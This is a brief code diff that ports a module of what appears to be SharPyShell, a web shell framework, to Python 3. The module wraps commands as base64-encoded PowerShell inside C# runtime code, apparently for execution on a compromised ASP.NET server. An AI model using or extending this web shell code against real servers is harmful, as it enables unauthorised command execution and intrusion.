@@ -32,7 +32,7 @@ class Exec_ps(Module):
 
         """
 
-    _runtime_code = ur"""
+    _runtime_code = r"""
                     using System;using System.IO;using System.Diagnostics;using System.Text;
                     public class SharPyShell
                     {                    
@@ -80,7 +80,7 @@ class Exec_ps(Module):
         if '""' in cmd:
             cmd = cmd.replace('""', '"')
         cmd = '$ProgressPreference = "SilentlyContinue";' + cmd
-        cmd = b64encode(cmd.encode('UTF-16LE'))
+        cmd = str(b64encode(cmd.encode('UTF-16LE')), 'UTF-8')
         working_path = self._module_settings['working_directory']
         return self._runtime_code % (cmd, working_path)
 
